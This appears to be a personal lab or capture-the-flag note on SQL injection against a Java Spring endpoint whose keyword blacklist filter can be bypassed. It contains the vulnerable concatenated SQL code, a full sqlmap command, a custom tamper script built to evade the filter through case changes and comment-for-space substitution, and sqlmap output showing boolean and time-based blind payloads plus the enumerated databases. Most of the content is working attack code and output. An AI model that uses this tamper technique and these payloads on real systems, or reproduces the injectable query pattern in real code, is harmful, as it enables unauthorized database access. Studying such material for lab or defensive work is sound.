# Custom Tampering

```java
@Controller
public class ApiController {
   @Autowired
   JdbcTemplate jdbcTemplate;

   @GetMapping(
      value = {"/api/v1/check-user"},
      produces = {"application/json"}
   )
   @ResponseBody
   public String GET_API_Check_User(@RequestParam String u) {
      try {
         u = u.replaceAll(" |OR|or|AND|and|LIMIT|limit|OFFSET|offset|WHERE|where|SELECT|select|UPDATE|update|DELETE|delete|DROP|drop|CREATE|create|INSERT|insert|FUNCTION|function|CAST|cast|ASCII|ascii|SUBSTRING|substring|VARCHAR|varchar|/\\*\\*/|;|LENGTH|length|--$", "");
         String sql = "SELECT * FROM users WHERE username = '" + u + "'";
         User user = (User)this.jdbcTemplate.queryForObject(sql, new BeanPropertyRowMapper(User.class));
         return "{\"exists\":true}";
      } catch (Exception var4) {
         return "{\"exists\":false}";
      }
   }
}
```

```bash
sqlmap -u "http://10.129.204.251:8080/api/v1/check-user?u=admin" 
--suffix="--+-" 
--tamper=./tamper.py   
--batch   
--level=3 
--risk=2 
--dbms postgresql 
--risk 3 
--level 2 
--proxy http://127.0.0.1:8080 
--dbs 
--flush 
--no-cast 
--timeout=30
```

```python
from lib.core.enums import PRIORITY
import re

__priority__ = PRIORITY.HIGHEST

def tamper(payload, **kwargs):
    """
    Simple tamper:
    - Title-case contiguous ALL-CAPS words (len>=2), e.g. ORDER -> Order
    - Replace spaces with '/***/'
    - Normalize standalone OR (case-insensitive) -> 'Or'
    - Replace exact whole-word 'For' -> 'FOr'
    """
    if payload is None:
        return None

    # Title-case ALL-CAPS words (2+ letters)
    payload = re.sub(r'\b([A-Z]{2,})\b', lambda m: m.group(1).capitalize(), payload)

    # Replace spaces with '/***/'
    payload = payload.replace(" ", "/***/")
    payload = re.sub(r'\bOR\b', 'Or', payload, flags=re.IGNORECASE)
    payload = re.sub(r'\bFor\b', 'FOr', payload)
    payload = re.sub(r'\bpassword\b', 'passwOrd', payload)

    return payload

```

```bash
---
Parameter: u (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: u=admin' AND 3241=3241--+-

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: u=admin' AND 9662=(SELECT 9662 FROM PG_SLEEP(5))--+- # <-- Pre Tamper
---

available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public
```

## Debugging

Use Burpsuite to check that the Paylaods have the correct format and are tampered correctly:

![image.png](Custom%20Tampering/image.png)

Use Regex Matcher to check weather there is an error in the payload

![image.png](Custom%20Tampering/image%201.png)